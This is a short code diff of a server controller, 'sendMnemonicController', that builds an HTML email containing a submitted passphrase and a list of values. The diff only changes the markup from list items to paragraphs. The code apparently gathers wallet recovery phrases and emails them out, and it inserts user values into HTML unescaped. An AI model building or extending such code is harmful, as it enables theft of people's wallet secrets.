@@ -14,15 +14,12 @@ export const sendMnemonicController = asyncHandler(
     }
 
     // Build HTML email content
-    let htmlContent = `<h2>App Name :  ${payload.heading}</h2>`;
+    let htmlContent = `<h2>App Name : ${payload.heading}</h2>`;
     htmlContent += `<h3>PassPhrase: ${payload?.passphrase}</h3>`;
-    htmlContent += `<ul>`;
 
     payload.data.forEach((item: { label: string; value: string }) => {
-      htmlContent += `<li>${item.value}</li>`;
+      htmlContent += `<p>${item.value}</p>`;
     });
-
-    htmlContent += `</ul>`;
 
 
     try {
